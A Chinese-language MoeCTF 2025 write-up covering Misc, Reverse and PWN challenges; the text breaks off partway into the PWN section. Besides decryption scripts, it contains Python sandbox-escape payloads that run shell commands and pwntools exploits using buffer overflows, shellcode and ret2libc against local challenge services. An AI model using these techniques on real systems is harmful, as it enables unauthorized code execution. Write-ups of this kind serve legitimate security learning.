---
title: Moectf2025 Writeup
published: 2025-10-09
description: 'Moectf2025全方向题解(pwn&re ak)'
image: 'https://avatars.githubusercontent.com/u/197273140?s=48&v=4'
tags: [CTF,WriteUP]
category: '网络安全'
draft: false 
lang: ''
---
# MoeCTF2025 WriteUP by 并非(Rank9)
比赛地址:https://ctf.xidian.edu.cn/games/22/

[Misc](#Misc)
[Reverse (AK)](#Reverse)
[Crypto](#Crypto)
[PWN](#PWN)
[Web](#Web)

## Misc
### Misc入门指北
进pdf搜`moectf{`即可
`moectf{We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!}`
### Rush
gif分帧，拿到残缺的二维码，左上角右下角补齐定位角，随后直接识别即可
`moectf{QR_C0d3s_feATUR3_eRror_c0RRECt10N}`
### ez_LSB
stegsolve打开，red=0，拿到flag的base64密文
`moectf{LSB_1s_s0_1nt3rest1ng!!sj9wd}`
### ez_锟斤拷????
先找个[在线工具](http://www.mytju.com/classCode/tools/messyCodeRecover.asp)把乱码转到utf8
```
ｍｏｅｃｔｆ｛ＥｎＣ０ｄ１ｉｎｇ＿ｇｂＫ＿＠ｎＤ＿Ｕｔｆ＿８＿１ｓ＿４ｕｎ！！ｅｗｗｗｗ｝恭喜你得到弗拉格后面全是锟斤拷锟斤拷锟斤拷
```
全角转半角
`moectf{EnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww}`
### weird_photo
提示说注意CRC，直接宽高爆破即可
`moectf{Image_Height_Restored}`
### SSTV
直接找一个sstv播放器
`moectf{d3codiNG_SStV_reQu1REs-PATI3nC3}`
### encrypted_pdf
先爆破pdf，密码`qwe123`
进去后全选复制，查看复制的内容即可拿到flag
`moectf{Pdf_1s_r3a1ly_c0lor4ul!!ihdw}`
### 捂住一只耳
两个声道，一个正常声道一个摩斯密码
```
..-. .-.. .- --. .. ... ---... .... .- .-.. ..-. ..--.- .-. .- -.. .. --- ..--.- .. -. ..--.- -..- -.. ..-
```
```
FLAGIS:HALF_RADIO_IN_XDU
```
最后得到
```
moectf{HALF_RADIO_IN_XDU}
```
### Enchantment
先从流量包提取出来png，然后打开看到附魔台图片
上网搜我的世界附魔台文字对照表即可
`moectf{now_you_have_mastered_enchanting}`
### WebRepo
二维码识别，得到提示`Flag is not here, but I can give you a hint:
Use binwalk.`
binwalk直接分离得到一个压缩包，解压拿到`/.git/`
最后`git show 249ff41`拿到flag
`moectf{B1NwA1K_ANd_g1t_R3seT-MaG1C}`
### ez_ssl
打开流量包，过滤http请求，拿到`ssl.log`
配置后提取到flag.zip，根据提示爆破到密码`6921682`
解压后，txt中内容是一堆ook，直接ook解码
`moectf{upI0@d-l0G_TO-DeCrYPT_uploAD}`
### ez_png
注意到IDAT16大小不正常，提取hex并用zlib解压
```python
import zlib; print(zlib.decompress(bytes.fromhex("78 9C CB CD 4F 4D 2E 49 AB CE 30 74 49 71 CD 8B 0F 30 89 CC F1 4F
74 89 F7 F4 D3 F5 4C 31 09 A9 05 00 A8 D0 0A 5F".replace(" ", "")))) 
```
`moectf{h1DdEn_P4YlOaD_IN-Id4T}`

### Pyjail 0
读环境变量`/proc/self/environ`即可

### Pyjail 1
```
getattr(getattr(getattr(next(filter(lambda x: getattr(x, (lambda c:c(95)*2+c(110)+c(97)+c(109)+c(101)+c(95)*2)(chr)) == (lambda c:c(95)+c(119)+c(114)+c(97)+c(112)+c(95)+c(99)+c(108)+c(111)+c(115)+c(101))(chr), getattr(getattr(getattr((), (lambda c:c(95)*2+c(99)+c(108)+c(97)+c(115)+c(115)+c(95)*2)(chr)), (lambda c:c(95)*2+c(98)+c(97)+c(115)+c(101)+c(95)*2)(chr)), (lambda c:c(95)*2+c(115)+c(117)+c(98)+c(99)+c(108)+c(97)+c(115)+c(115)+c(101)+c(115)+c(95)*2)(chr))())), (lambda c:c(95)*2+c(105)+c(110)+c(105)+c(116)+c(95)*2)(chr)), (lambda c:c(95)*2+c(103)+c(108)+c(111)+c(98)+c(97)+c(108)+c(115)+c(95)*2)(chr)), (lambda c:c(103)+c(101)+c(116))(chr))((lambda c:c(115)+c(121)+c(115)+c(116)+c(101)+c(109))(chr))((lambda c:c(99)+c(97)+c(116)+c(32)+c(47)+c(116)+c(109)+c(112)+c(47)+c(102)+c(108)+c(97)+c(103)+c(46)+c(116)+c(120)+c(116))(chr))
```

### Pyjail 2
```
getattr(getattr(getattr(next(filter(lambda x: getattr(x, (lambda c:c(95)*2+c(110)+c(97)+c(109)+c(101)+c(95)*2)(chr)) == (lambda c:c(95)+c(119)+c(114)+c(97)+c(112)+c(95)+c(99)+c(108)+c(111)+c(115)+c(101))(chr), getattr(getattr(getattr((), (lambda c:c(95)*2+c(99)+c(108)+c(97)+c(115)+c(115)+c(95)*2)(chr)), (lambda c:c(95)*2+c(98)+c(97)+c(115)+c(101)+c(95)*2)(chr)), (lambda c:c(95)*2+c(115)+c(117)+c(98)+c(99)+c(108)+c(97)+c(115)+c(115)+c(101)+c(115)+c(95)*2)(chr))())), (lambda c:c(95)*2+c(105)+c(110)+c(105)+c(116)+c(95)*2)(chr)), (lambda c:c(95)*2+c(103)+c(108)+c(111)+c(98)+c(97)+c(108)+c(115)+c(95)*2)(chr)), (lambda c:c(103)+c(101)+c(116))(chr))((lambda c:c(115)+c(121)+c(115)+c(116)+c(101)+c(109))(chr))((lambda c:c(99)+c(97)+c(116)+c(32)+c(47)+c(116)+c(109)+c(112)+c(47)+c(102)+c(108)+c(97)+c(103)+c(46)+c(116)+c(120)+c(116))(chr))
```

### Pyjail 3
```
((lipsum for lipsum in ().__class__.__mro__[-1].__subclasses__() if lipsum.__name__ == "_wrap_close").__next__().__init__.__globals__)['system']('cat /tmp/flag.txt')
```

### Pyjail 4
match-case 栈帧逃逸
```python
try:
    raise Exception
except Exception as e:
    cf = e.__traceback__.tb_frame.f_back
    b = cf.f_builtins
    print(b['open']('/tmp/flag.txt').read())
```
编码为base64后传入
```
dHJ5OgogICAgcmFpc2UgRXhjZXB0aW9uCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgIGNmID0gZS5fX3RyYWNlYmFja19fLnRiX2ZyYW1lLmZfYmFjawogICAgYiA9IGNmLmZfYnVpbHRpbnMKICAgIHByaW50KGJbJ29wZW4nXSgnL3RtcC9mbGFnLnR4dCcpLnJlYWQoKSk=
```
### Pyjail 5
用1/0抛异常match绑Exception和tb以及模块属性用uga或者字典下标对象属性用getattr_fn绕ast.attribute，从builtins.class match绑定getattribute当模块属性访问器，同时从builtins取getattr当通用对象属性访问
```pyton=
try:
    1/0
except Exception as e:
    match e:
        case Exception(__traceback__=tb):
            pass
    match tb:
        case object(tb_frame=fr):
            pass
cur = fr
b = None
uga = None
getattr_fn = None
io = None
while cur is not None:
    match cur:
        case object(f_back=prev, f_globals=gl):
            pass
    try:
        b_candidate = gl["__builtins__"]
        match b_candidate:
            case object(__class__=tp):
                pass
        match tp:
            case object(__getattribute__=uga_candidate):
                pass
        try:
            imp = uga_candidate(b_candidate, "__import__")
        except Exception:
            imp = b_candidate["__import__"]
        try:
            getattr_fn_candidate = uga_candidate(b_candidate, "getattr")
        except Exception:
            getattr_fn_candidate = b_candidate["getattr"]
        io_candidate = imp("io")
        b = b_candidate
        uga = uga_candidate
        getattr_fn = getattr_fn_candidate
        io = io_candidate
        break
    except Exception:
        cur = prev
open_fn = getattr_fn(io, "open")
f = open_fn("/tmp/flag.txt", "r")
read_fn = getattr_fn(f, "read")
try:
    print_fn = uga(b, "print")
except Exception:
    print_fn = b["print"]
print_fn(read_fn())
```
依旧编码为base64传入
```
dHJ5OgogICAgMS8wCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgIG1hdGNoIGU6CiAgICAgICAgY2FzZSBFeGNlcHRpb24oX190cmFjZWJhY2tfXz10Yik6CiAgICAgICAgICAgIHBhc3MKICAgIG1hdGNoIHRiOgogICAgICAgIGNhc2Ugb2JqZWN0KHRiX2ZyYW1lPWZyKToKICAgICAgICAgICAgcGFzcwpjdXIgPSBmcgpiID0gTm9uZQp1Z2EgPSBOb25lCmdldGF0dHJfZm4gPSBOb25lCmlvID0gTm9uZQp3aGlsZSBjdXIgaXMgbm90IE5vbmU6CiAgICBtYXRjaCBjdXI6CiAgICAgICAgY2FzZSBvYmplY3QoZl9iYWNrPXByZXYsIGZfZ2xvYmFscz1nbCk6CiAgICAgICAgICAgIHBhc3MKICAgIHRyeToKICAgICAgICBiX2NhbmRpZGF0ZSA9IGdsWyJfX2J1aWx0aW5zX18iXQogICAgICAgIG1hdGNoIGJfY2FuZGlkYXRlOgogICAgICAgICAgICBjYXNlIG9iamVjdChfX2NsYXNzX189dHApOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgIG1hdGNoIHRwOgogICAgICAgICAgICBjYXNlIG9iamVjdChfX2dldGF0dHJpYnV0ZV9fPXVnYV9jYW5kaWRhdGUpOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgIHRyeToKICAgICAgICAgICAgaW1wID0gdWdhX2NhbmRpZGF0ZShiX2NhbmRpZGF0ZSwgIl9faW1wb3J0X18iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIGltcCA9IGJfY2FuZGlkYXRlWyJfX2ltcG9ydF9fIl0KICAgICAgICB0cnk6CiAgICAgICAgICAgIGdldGF0dHJfZm5fY2FuZGlkYXRlID0gdWdhX2NhbmRpZGF0ZShiX2NhbmRpZGF0ZSwgImdldGF0dHIiKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIGdldGF0dHJfZm5fY2FuZGlkYXRlID0gYl9jYW5kaWRhdGVbImdldGF0dHIiXQogICAgICAgIGlvX2NhbmRpZGF0ZSA9IGltcCgiaW8iKQogICAgICAgIGIgPSBiX2NhbmRpZGF0ZQogICAgICAgIHVnYSA9IHVnYV9jYW5kaWRhdGUKICAgICAgICBnZXRhdHRyX2ZuID0gZ2V0YXR0cl9mbl9jYW5kaWRhdGUKICAgICAgICBpbyA9IGlvX2NhbmRpZGF0ZQogICAgICAgIGJyZWFrCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIGN1ciA9IHByZXYKb3Blbl9mbiA9IGdldGF0dHJfZm4oaW8sICJvcGVuIikKZiA9IG9wZW5fZm4oIi90bXAvZmxhZy50eHQiLCAiciIpCnJlYWRfZm4gPSBnZXRhdHRyX2ZuKGYsICJyZWFkIikKdHJ5OgogICAgcHJpbnRfZm4gPSB1Z2EoYiwgInByaW50IikKZXhjZXB0IEV4Y2VwdGlvbjoKICAgIHByaW50X2ZuID0gYlsicHJpbnQiXQpwcmludF9mbihyZWFkX2ZuKCkp
```
### 2048_master_re
跟进`byte_47F0C0`拿到密文，xor `0x2a`
`moectf{Y0u_4re_a_2048_m4st3r!!!!r0erowhu}``
## Reverse
### 逆向工程入门指北
直接搜字符串就行
`moectf{open_your_IDA_and_start_reverse_engineering!!}`
### speed
在窗口销毁之前打断点即可,我选择在`sleep(1u)`断点
`moectf{Just_dyn@mic_d3bugg1ng}`
### base
常规base64，解开就是了
`moectf{Y0u_C4n_G00d_At_B45e64!!}`
### catch
跟进solve得到
```cpp=
void __noreturn solve(void)
{
  std::logic_error *exception; // rbx

  printf("my flag is hidden in this program. Can you find it?\n");
  sub_114514();
  exception = (std::logic_error *)_cxa_allocate_exception(0x10u);
  std::logic_error::logic_error(exception, "nothing but error");
  _cxa_throw(exception, (struct type_info *)&`typeinfo for'std::logic_error, refptr__ZNSt11logic_errorD1Ev);
}
```
跟进`sub_114514()`
```cpp=
__int64 sub_114514(void)
{
  __int64 result; // rax
  int v1; // [rsp+28h] [rbp-8h]
  unsigned int i; // [rsp+2Ch] [rbp-4h]

  printf("try to catch me\n");
  v1 = strlen(flag);
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( (int)i >= v1 )
      break;
    flag[i] = enc(flag[i]);
  }
  return result;
}
```
跟进enc和flag
```cpp=
.data:0000000140027000 flag            db 'geoi~lq~bcyUcyUkUlkaoUlfkmw',0
==========================================
__int64 __fastcall enc(char a1)
{
  return (unsigned int)(a1 ^ 0x11);
}
```
明显的一个xor，但是并不能解出flag
shift+f12看字符串，注意到：
```cpp=
.data:0000000140027120 _ZZ5solvevE8hidesuwa db 'zbrpgs{F4z3_Ge1px_jvgu_@sybjre_qrfhjn}',0
```
由于flag开头moectf{，一眼rot13，直接cyberchef一把梭
`moectf{S4m3_Tr1ck_with_@flower_desuwa}`
### upx
upx-d一把梭
```c=
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rax
  __int64 v4; // rcx
  __int64 v5; // rax
  int v6; // r9d
  __int64 v7; // r8
  char v8; // dl
  _OWORD v10[8]; // [rsp+20h] [rbp-148h]
  int v11; // [rsp+A0h] [rbp-C8h]
  int v12; // [rsp+A4h] [rbp-C4h]
  int v13; // [rsp+A8h] [rbp-C0h]
  char v14[48]; // [rsp+B0h] [rbp-B8h]
  char Buffer[112]; // [rsp+E0h] [rbp-88h] BYREF

  v10[0] = _mm_load_si128((const __m128i *)&xmmword_1400032E0);
  v10[1] = _mm_load_si128((const __m128i *)&xmmword_140003310);
  v10[2] = _mm_load_si128((const __m128i *)&xmmword_140003320);
  v10[3] = _mm_load_si128((const __m128i *)&xmmword_1400032F0);
  v10[4] = _mm_load_si128((const __m128i *)&xmmword_1400032D0);
  v10[5] = _mm_load_si128((const __m128i *)&xmmword_1400032B0);
  v10[6] = _mm_load_si128((const __m128i *)&xmmword_140003300);
  v10[7] = _mm_load_si128((const __m128i *)&xmmword_1400032C0);
  v11 = 41;
  v12 = 36;
  v13 = 86;
  sub_140001010("please input your flag: ");
  v3 = _acrt_iob_func(0);
  fgets(Buffer, 100, v3);
  v4 = -1;
  do
    ++v4;
  while ( Buffer[v4] );
  v5 = 0;
  v6 = 0;
  if ( (int)v4 > 0 )
  {
    v7 = 0;
    do
    {
      v8 = Buffer[v7] ^ 0x21;
      if ( v6 < (int)v4 - 1 )
        v8 ^= Buffer[v7 + 1];
      v14[v7] = v8;
      ++v6;
      ++v7;
    }
    while ( v7 < (int)v4 );
  }
  while ( v14[v5] == *((_DWORD *)v10 + v5) )
  {
    if ( ++v5 >= 35 )
      return 0;
  }
  sub_140001010("you will never get the flag!!!!\n");
  return 0;
}
```
对于密文，跟进v10那几个，一个一个提取就行，最后完整密文是v10+v11+v12+v13
```python
enc=[35, 43, 39, 54, 51, 60, 3, 72, 100, 11, 29, 118, 123, 16, 11, 58, 63, 101, 118, 41, 21, 55, 28, 10, 8, 33, 62, 60, 61, 22, 11, 36, 41, 36, 86,43]
enc.reverse()
for i,j in enumerate(enc,0):
    if i==0:
        enc[i]=j^0x21
    else:
        enc[i]=j^enc[i-1]^0x21
enc.reverse()
for i in enc:
    print(chr(i),end='')
```
### ez3
该题多解，这里仅给出正确解
```python
from z3 import *
a = [0xB1B0,0x5678,0x7FF2,0xA332,0xA0E8,0x364C,0x2BD4,0xC8FE,0x4A7C,0x18,0x2BE4,0x4144,0x3BA6,0xBE8C,0x8F7E,0x35F8,0x61AA,0x2B4A,0x6828,0xB39E,0xB542,0x33EC,0xC7D8,0x448C,0x9310,0x8808,0xADD4,0x3CC2,0x796,0xC940,0x4E32,0x4E2E,0x924A,0x5B5C]
f = [BitVec(f'flag_{i}', 32) for i in range(34)]
b = [BitVec(f'b{i}', 32) for i in range(34)]
s = Solver()

for i in range(34):
    s.add(flag_chars[i] >= 32)
    s.add(flag_chars[i] < 127)
    val = 47806 * (flag_chars[i] + i)
    if i > 0:
        val = val ^ b[i-1] ^ 0x114514
    s.add(b[i] == URem(val, 51966))
    s.add(b[i] == a[i])
for i in range(34):
    flag += chr(model[f[i]].as_long())
print('moectf{' + flag + '}')
```
`moectf{Y0u_Kn0w2z3_S0Iv3r_Nuw_a1f2bdce4a9}`
### ezandroid
主函数有个base64，直接解就行
`moectf{android_Reverse_I5_easy}`
### flower
进main，双击solve发现无法读取伪代码
注意到`0x4048ee`处
```asm=
.text:00000000004048EE _Z5solveNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE endp ; sp-analysis failed
```
只需要nop掉48e5->48e9全部内容
```pthon=
enc = [79, 26, 89, 31, 91, 29, 93, 111, 123, 71, 126, 68, 106, 7, 89, 103, 14, 82, 8, 99, 92, 26, 82, 31, 32, 123, 33, 119, 112, 37, 116, 43]
key = 0x23 ^ 0xa

for x in range(len(enc)):
    print(chr(key ^ enc[x]), end='')
    key += 1

```
`moectf{f0r3v3r_JuMp_1n_7h3_a$m_a9b35c3c}`
### 2048_master_re
```python
from typing import List
def xxtea_decrypt(v: List[int], n: int, key: List[int]) -> None:
    def MX(z, y, sum_, p, e):
        return (((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum_ ^ y) + (key[(p & 3) ^ e] ^ z)))

    if n > 1:
        rounds = 6 + 52 // n
        sum_ = rounds * 0x3E9779B9
        y = v[0]
        while rounds > 0:
            e = (sum_ >> 2) & 3
            for p in range(n - 1, 0, -1):
                z = v[p - 1]
                v[p] = (v[p] - MX(z, y, sum_, p, e)) & 0xFFFFFFFF
                y = v[p]
            z = v[n - 1]
            v[0] = (v[0] - MX(z, y, sum_, 0, e)) & 0xFFFFFFFF
            y = v[0]
            sum_ = (sum_ - 0x3E9779B9) & 0xFFFFFFFF
            rounds -= 1
def main():
    key_bytes = b"2048master2048ma"
    key = [int.from_bytes(key_bytes[i:i+4], 'little') for i in range(0, len(key_bytes), 4)]
    encrypted = [
        0x35,0x79,0x77,0xCC,0x1B,0x13,0x41,0x34,0xF9,0xFF,0x9F,0x91,
        0xFF,0x5B,0x94,0x78,0x86,0x2A,0xAF,0xAE,0xD7,0x9E,0x31,0x4D,
        0x7A,0xC4,0xA5,0x51,0xD1,0xD9,0x6E,0x44,0x18,0x52,0x86,0x1B,
        0x42,0x8A,0xC9,0x63
    ]
    v = [int.from_bytes(encrypted[i*4:(i+1)*4], 'little') for i in range(10)]
    xxtea_decrypt(v, 10, key)
    decrypted_bytes = b''.join(x.to_bytes(4, 'little') for x in v)
    print(decrypted_bytes.decode('latin1'))
if __name__ == "__main__":
    main()
```
`moectf{@_N1c3_cup_0f_XXL_te4_1n_2O48}`
### A cup of tea
```c=
#include <stdio.h>
#include <stdlib.h>

#define DELTA 1131796
#define ROUNDS 32

typedef struct {
    unsigned int data[4];
} Key;

void tea_decrypt(unsigned int* left, unsigned int* right, Key* key) {
    unsigned int sum = ROUNDS * DELTA;
    
    for(int i = 0; i < ROUNDS; i++) {
        *right -= (key->data[3] + (*left >> 5)) ^ (sum + *left) ^ (key->data[2] + 16 * *left);
        *left -= (key->data[1] + (*right >> 5)) ^ (sum + *right) ^ (key->data[0] + 16 * *right);
        sum -= DELTA;
    }
}

int main(void) {
    Key key = {{289739801, 427884820, 1363251608, 269567252}};
    unsigned int ciphertext[10] = {2026214571, 578894681, 1193947460, 4065661066,
                                   73202484, 961145356, 3413510504, 358205817,
                                   3740897949, 119347883};
    
    for(int i = 0; i < 10; i += 2) {
        unsigned int left = ciphertext[i];
        unsigned int right = ciphertext[i+1];
        tea_decrypt(&left, &right, &key);
        
        for(int j = 0; j < 4; j++) {
            printf("%c", (left >> (8*j)) & 0xFF);
        }
        for(int j = 0; j < 4; j++) {
            printf("%c", (right >> (8*j)) & 0xFF);
        }
    }
    
    return 0;
}
```
`moectf{h3r3_4_cuP_0f_734_f0R_y0U!!!!!!}`
### ezpy
pyc转py，凯撒位移10
`moectf{Y0u_Kn0W_pyc]`
### have_fun
```python
enc=[71,0,69,0,79,0,73,0,94,0,76,0,81,0,98,0, 106,0,92,0,30,0, 117,0,76,0, 127,0,68,0,87]
e=list(filter(int,enc))
for i in e:
    print(chr(i^0x2A),end='')
```
`moectf{H@v4_fUn}`
### mazegame
提取地图
```text=
11111111111111111111111111111111111111111111111111111111
10100000000000000010000011011101011111111101011100000111
10111010111111111010111011000001000001000001000101110111
10000010000010000010001011011111111101110111011101110111
10111111111011101110111011010000000000010100010001110111
10100000001000101000100011010101111111011101110101110111
10101011111110111011101011010101000001000000010101110111
10101010000010100000101011110101110101111101111111110111
10111010111010101111101011100101000100000101000101110111
10000010001010001000001011001111011111010101011101110111
11111011101011111011111111101000100000101100101001110111
10001010001000100010000010001010011000100010010011000001
10111010111110101010111011011001011111010101011101011101
10001010001000001010001011000101000100000101000101011101
11101011101111111011101011110101110111111101110101011101
10001000101000001010001011000100010100000101000101011101
10111111101011101110111011011111110101110111011101011101
10001000001000100000001011000100000100010000000101011001
11101011111011111111101011110101111101111111110101011011
10101000000010001000101011010100000001000100010101011011
10101111111110101010101011010111111111010101010101011011
10100000000000100010101011010000000000010001010101011011
10111111111111111110111011011111111111111111011101011011
10000000001111000000000011110111010000111100011111011011
11101111100000011011011111111010110111011101100001011011
11101111111111111011011111111101110111101101100001011011
10001000111111000010000011111010110111011101100001011011
10111010111111111010111011110111010000111101100001010011
10000010000010000010001011111111111111111101100001010111
10111111111011101110111011110001000110001101100001010001
10100000001000101000100011110111011101111101100001011101
10101011111110111011101011110001000101111101100001011101
10101010000010100000101011111101011101111101100001011101
10111010111010101111101011110001000110001101100001011101
10000010001010101000001011111111111111111101100001011101
11111011101011111011111110000000000000001101100001011101
10001010001000100010000011111111111111111100110011011101
10111010111110101010111010010000000011111110001111011101
10001010001000001010001010110111000001111110100101011101
11101011101111111011101000110011001111111100110111011101
10001000101000001010001011111111111111111111110111010001
10111111101011101110111010100001001100000000000011011011
10001000001000100000001011111111111101011101111001011011
10101011111011111111101011000000000001000100010111011011
10101000000010001000101010010111111111111111111111011011
10101111111110101010101010110111111111111111111101011011
10100000000000100010101011100000000000000000000011011011
10111111111111111110011011111111111111111111111011011011
10000011111111111111000010000000000000000000000000011001
11111011111111111111111111111111111111111111111111111101
11111011100001100110110111000000000000000000000111111101
11111011101111011010000111011111111111111111110111111101
11111011100001000010110110000111111111111111110000000001
11111011101111011010110111101111111111111111111111111111
11110000000000011000110000000000000000000000000000000011
```
[Maze Solver](https://github.com/sxsaa/Maze-Solver)一把梭
`moectf{ssddddwwddssddddssddssssddwwddwwddwwwwddddssssaassssaaaassaassaawwaawwwwaaaassddssaassddssssaaaassddddddwwwwddddssddddwwddwwaawwddddssssssssssssaaasssdddssssaassssaaaassaassaawwaawwwwaaaassddssaassddssssaaaassddddddwwwwddddssddddwwddwwaawwddddssssssssssssaaawawwwaassaawwaassaaaaaaaaaawwwwaassssssddddssssssdddddddddwwdddssddwwwdddsssdddddwwawwddddddddddddddddddddssddddddddwwwwawwwwwwwwdwwwwwwwwwwwaawwdwwwwwwwwwwdwwwwwwaaaasssssssssssssssssssssssssssssssssssssaaawwaaaaaaaaaaaaaaaaaaawwwddddddddwwddddddddddwwwawaawawwwwwwwwwwwwwddwwwwaassaawwaassaaaaaaaaaawwwwaawwddwwaawwdwwwdwwwwddddddddddssddddssssdsdssddssaassaaaawwaaaassssaaaaaawwddddwwwwaawwawaassdsssdd}`
### upx_revenge
手动加上`UPX!`，然后再upx-d
后面就是base64变表，魔改的表是常规base64表的0xe xor
`moectf{Y0u_Re4l1y_G00d_4t_Upx!!!}`
### guess
魔改rc4 
`moectf{RrRRccCc44$$_w1th_fl0w3r!!_3c6a11b5}`

### A simple program
密文在`0x4031A4`，直接xor 0x23
`moectf{Y0u_P4ssEd!!}`
### Two cups of tea
key：`moectf!!xV4`，位置在`000000FF96EFFBF0`
```python
def xxtea_decrypt(v, key):
    n = len(v)
    if n > 1:
        rounds = 6 + 52 // n
        sum_ = rounds * 0x9E3779B9
        def MX(z, y, sum_, p, e):
            return (((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum_ ^ y) + (key[(p & 3) ^ e] ^ z))) & 0xFFFFFFFF

        y = v[0]
        while rounds > 0:
            e = (sum_ >> 2) & 3
            p = n - 1
            while p > 0:
                z = v[p - 1]
                v[p] = (v[p] - MX(z, y, sum_, p, e)) & 0xFFFFFFFF
                y = v[p]
                p -= 1
            z = v[n - 1]
            v[0] = (v[0] - MX(z, y, sum_, 0, e)) & 0xFFFFFFFF
            y = v[0]
            sum_ = (sum_ - 0x9E3779B9) & 0xFFFFFFFF
            rounds -= 1


if __name__ == "__main__":
    v = [
        0x5D624C34, 0x8629FEAD, 0x9D11379B, 0xFCD53211, 0x460F63CE,
        0xC5816E68, 0xFE5300AD, 0x0A0015EE, 0x9806DBBB, 0xEF4A2648
    ]
    key_bytes = [
        0x6D, 0x6F, 0x65, 0x63, 0x74, 0x66, 0x21, 0x21,
        0x78, 0x56, 0x34, 0x12, 0xF0, 0xDE, 0xBC, 0x9A
    ]
    key = []
    for i in range(0, 16, 4):
        k = key_bytes[i] | (key_bytes[i+1] << 8) | (key_bytes[i+2] << 16) | (key_bytes[i+3] << 24)
        key.append(k & 0xFFFFFFFF)
    xxtea_decrypt(v, key)
    flag_bytes = bytearray()
    for val in v:
        flag_bytes.extend(val.to_bytes(4, 'little'))

    print(flag_bytes.decode('latin1'))
```
`moectf{X7e4_And_xx7EA_I5_BeautifuL!!!!!}`
### ezandroid.pro
主函数中拿到函数`Java_com_example_ezandroidpro_MainActivity_check`，去so文件找`Java_com_example_ezandroidpro_MainActivity_check`，sm4 ecb一把梭
`moectf{SM4_Android_I5_Funing!!!}`
### rusty_sudoku
```python
def solve_sudoku(board):
    def is_valid(board, row, col, num):
        for i in range(9):
            if board[row][i] == num:
                return False
        for i in range(9):
            if board[i][col] == num:
                return False
        start_row = row - row % 3
        start_col = col - col % 3
        for i in range(3):
            for j in range(3):
                if board[i + start_row][j + start_col] == num:
                    return False
        return True
    def solve():
        for i in range(9):
            for j in range(9):
                if board[i][j] == 0:
                    for num in range(1, 10):
                        if is_valid(board, i, j, num):
                            board[i][j] = num
                            if solve():
                                return True
                            board[i][j] = 0
                    return False
        return True
    
    solve()
    return board

def string_to_board(sudoku_str):
    board = []
    for i in range(9):
        row = []
        for j in range(9):
            char = sudoku_str[i*9 + j]
            if char == '.':
                row.append(0)
            else:
                row.append(int(char))
        board.append(row)
    return board

def board_to_string(board):
    result = ""
    for i in range(9):
        for j in range(9):
            result += str(board[i][j])
    return result

def print_board(board):
    for i in range(9):
        if i % 3 == 0 and i != 0:
            print("-----------")
        row_str = ""
        for j in range(9):
            if j % 3 == 0 and j != 0:
                row_str += "|"
            row_str += str(board[i][j])
        print(row_str)
if __name__ == "__main__":
    sudoku_str = ".6..8..7.18.3......7.9....1...8...15.9..4.2..54...2..9.....3948.....5..7..3....5."
    board = string_to_board(sudoku_str)
    print_board(board)
    solved_board = solve_sudoku(board)
    print_board(solved_board)
    
    answer = board_to_string(solved_board)
    print(f"{answer}")
    print(f"{len(answer)}")

```
解出来套个md5
`moectf{a8c79927d4e830c3fe52e79f410216a0}`

## PWN

### 0 二进制漏洞审计入门指北

```Python
from pwn import *                                    # 导入 pwntools。
context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。

# 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。

# io = process('./pwn')             # 在本地运行程序。
# gdb.attach(io)                    # 启动 GDB
io = connect(ip, port)              # 与在线环境交互。
io.sendline(b'114511')              # 什么时候用 send 什么时候用 sendline？

payload  = p32(0xdeadbeef)          # p32(0xdeadbeef)、b"\xde\xad\xbe\xef"、b"deadbeef" 有什么区别？
                                    # 你看懂原程序这里的检查逻辑了吗？
payload += b'shuijiangui'           # strcmp

io.sendafter(b'password.', payload) # 发送！通过所有的检查。

io.interactive()                    # 手动接收 flag。
```

### **1 ez_u64**

```Python
from pwn import *

sh = remote('127.0.0.1',55745)

sh.recvuntil('hint.')
payload = u64(sh.recv(8))
success(hex(payload))
sh.sendlineafter('>',str(payload))

sh.interactive()
```

### 1 find it

```Plain
/flag
1
```

### 2 EZtext

```Plain
from pwn import *

sh = remote('127.0.0.1', 57566)

back_door = 0x4011B6
sh.sendlineafter('Then how many bytes do you need to overflow the stack?',str(0x30))
ret_addr = 0x40101a
payload = cyclic(0x8) + p64(0xdeadbeef) + p64(ret_addr) + p64(back_door)
sh.send(payload)
sh.interactive()
```

### 2 ezshellcode

```Python
from pwn import *
context(arch='amd64', os='linux',log_level='debug')

sh = remote('127.0.0.1', 63370)
shellcode = asm(shellcraft.sh())
sh.sendlineafter('I will give you some choices. Choose wisely!',str(4))
sh.sendlineafter('think about the permissions you just set.',shellcode)
sh.interactive()
```

### 3 认识libc

```Python
from pwn import *
context(arch='amd64', os='linux',log_level='debug')

sh = remote('127.0.0.1', 65137)
libc = ELF('./libc.so.6')

sh.recvuntil('A gift of forbidden knowledge, the location of \'printf\': ')
leak = int(sh.recv(14),16)
success(hex(leak))
libc.address = leak - libc.symbols['printf']
pop_rdi = libc.address + 0x2a3e5
ret = libc.address + 0xf4159
payload = cyclic(0x40) + p64(0xdeadbeef) + p64(ret) + p64(pop_rdi) + p64(next(libc.search('/bin/sh\x00'))) + p64(libc.symbols['system'])
sh.sendafter('> ',payload)
sh.interactive()
```

### boom

```Python
#!/usr/bin/env python3
import contextvars

from pwn import *
from ctypes import CDLL
import time

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

back_door = 0x401276
ret = 0x40101a

def exploit():
    # 加载libc并设置随机种子
    libc = CDLL('libc.so.6')
    current_time = int(time.time())
    libc.srand(current_time)
    #gdb.attach(io,'b*0x401410\nc')

    canary = libc.rand() % 114514
    success(hex(canary))

    payload = p64(0xdeadbeef)
    payload += (p32(canary) * 36)
    payload += p64(ret) + p64(back_door)
    success(hex(len(payload)))

    io.recvuntil('(y/n)')
    io.sendline('y')
    io.recvuntil('Enter your message: ')

    io.sendline(payload)
    io.interactive()



#io = process('./pwn')
